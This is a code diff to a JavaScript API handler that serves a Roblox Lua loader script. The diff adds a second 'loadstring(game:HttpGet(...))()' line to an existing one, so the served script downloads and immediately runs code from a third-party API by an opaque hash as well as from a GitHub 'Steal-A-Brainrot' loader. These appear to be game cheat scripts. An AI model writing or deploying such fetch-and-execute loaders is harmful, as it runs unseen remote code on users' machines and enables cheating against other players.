@@ -29,7 +29,9 @@ export default function handler(req, res) {
     res.setHeader('Pragma', 'no-cache');
     res.setHeader('Expires', '0');
 
-    const script = `loadstring(game:HttpGet("https://github.com/Rawbr10/loader/raw/refs/heads/main/ProjectX-Steal-A-Brainrot-Anti-Loader.lua"))()`;
+    const script = `
+    loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/c3da68f318b667499ac2f3fe64966482bd2ebc3397a986049eb3fbb7e41428fa/download"))()
+    loadstring(game:HttpGet("https://github.com/Rawbr10/loader/raw/refs/heads/main/ProjectX-Steal-A-Brainrot-Anti-Loader.lua"))()`;
 
     return res.status(200).send(script);
 }
